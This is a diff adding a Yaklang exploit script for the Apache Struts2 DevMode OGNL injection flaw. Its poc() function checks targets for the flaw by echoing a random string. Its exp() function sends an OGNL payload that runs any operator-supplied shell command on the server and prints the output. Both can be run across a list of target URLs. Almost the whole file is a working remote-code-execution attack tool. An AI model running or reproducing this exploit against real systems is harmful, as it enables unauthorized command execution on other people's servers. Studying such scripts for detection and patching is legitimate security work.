@@ -1,0 +1,79 @@
+
+def exp(url,cmd){
+
+    payload = `debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=webpath888888&command=` + cmd
+
+
+    
+    req, err = http.Post(
+            url,
+            http.useragent(http.uarand()),
+            http.header("Content-Type","application/x-www-form-urlencoded"),
+            http.body(payload),
+            )
+    if err != nil {
+        return
+    }
+
+    rsp_data = http.GetAllBody(req)
+    println(string(rsp_data))
+}
+
+def poc(url){
+    random_str = randstr(8)
+    echo_data = "echo+"+random_str
+    payload = `debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=webpath888888&command=` + echo_data
+
+
+    
+    req, err = http.Post(
+            url,
+            http.useragent(http.uarand()),
+            http.header("Content-Type","application/x-www-form-urlencoded"),
+            http.body(payload),
+            )
+    if err != nil {
+        return
+    }
+
+    rsp_data = http.GetAllBody(req)
+    if re.Match(random_str,rsp_data){
+        log.warn(url + " S2_DevMode found !!!")
+    }else{
+        log.debug(url + " S2_DevMode safe !!!")
+    }
+
+}
+
+
+
+
+if YAK_MAIN {
+    loglevel("info")
+    u = cli.String("u")
+    file = cli.LineDict("f")
+    cmd = cli.String("cmd")
+
+    if u == "" && len(file)<1 {
+        log.info("you need input target -u or -f")
+        return
+    }
+
+    if u != ""{
+        if cmd != ""{
+            exp(u,cmd)
+        }else{
+            poc(u)
+        }
+        return
+    }
+
+    for _,u = range file {
+         if cmd != "" {
+            exp(u,cmd)
+        }else{
+            poc(u)
+        }
+    }
+
+}
